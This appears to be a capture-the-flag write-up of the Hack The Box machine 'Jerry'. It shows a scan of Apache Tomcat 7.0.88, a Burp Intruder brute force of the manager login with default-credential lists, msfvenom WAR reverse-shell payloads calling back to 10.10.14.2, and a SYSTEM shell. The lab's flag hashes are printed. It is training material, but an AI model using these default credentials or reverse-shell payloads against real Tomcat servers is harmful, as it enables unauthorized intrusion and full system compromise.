# Enumeration

## Nmap scan
```
nmap -sC -sV -Pn jerry.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 01:15 EST
Nmap scan report for jerry.htb (10.129.210.31)
Host is up (0.18s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.41 seconds
```

## Feroxbuster


## http - TCP port 8080

access to `http://jerry.htb:8080`

apache tomcat 7.0.88 shows up
![[Pasted image 20230213152928.png]]

There is a login prompt in Manager App


## Basic authentication
The login uses basic authentication.
Using burp suite, we can intercept the login part.

```
GET /manager/html HTTP/1.1

Host: jerry.htb:8080

Cache-Control: max-age=0

Authorization: Basic YWRtaW46YWRtaW4=

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close
```

Notice that
`YWRtaW46YWRtaW4=` is base64 and is decoded to `admin:admin`

### Prepare intruder payload

We use this payload and take usernames and passwords for bruteforce enumeration.
https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

Lets prepare username lists
Username
```
admin
both
manager
role1
root
tomcat
```

Next, password lists
Password
```
password
password1
Password1
admin
tomcat
role1
manager
changethis
root
r00t
toor
s3cret
```


### Burp suite brute force
We use intruder
#### Choose custom location
![[Pasted image 20230214104127.png]]

#### Choose Payload type
![[Pasted image 20230214104747.png]]

#### Choose Payload Options
![[Pasted image 20230214104815.png]]

![[Pasted image 20230214104830.png]]

#### Add payload processing
![[Pasted image 20230214104850.png]]

#### Attack
![[Pasted image 20230214105013.png]]

`dG9tY2F0OnMzY3JldA==` is `tomcat:s3cret`


## Login
Username: tomcat
Password:s3cret

### Upload file
![[Pasted image 20230214092623.png]]

WAR file can be uploaded?


# Foothold

## Create reverse shell

### Msfvenom
msfvenom is a payload generator.

### Look for the right payload
```
msfvenom -l payloads | grep java
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
    java/meterpreter/bind_tcp                                          Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                                      Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                                     Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                                       Run a meterpreter server in Java. Connect back stager
    java/shell/bind_tcp                                                Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
    java/shell/reverse_tcp                                             Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
    java/shell_reverse_tcp                                             Connect back to attacker and spawn a command shell

```

#### Payload 1
java/jsp_shell_reverse_tcp might be suitable for us. 
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > revshell.war
```

#### Payload 2
java/meterpreter/reverse_tcp might work too.
```
sfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > revshell2.war
```

## Get shell
![[Pasted image 20230214094400.png]]
- Use Payload 1
- Upload this revshell file in Tomcat
- Setup nc `nc -lnvp 4444 `
- Click on the /revshell

```
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

## Get flags
```
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```


## Sidenote (Trying Payload 2)
I was able to use the second payload, but I could not run whoami command.
```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.108.101] 49196
whoami
java.lang.OutOfMemoryError: Java heap space       
```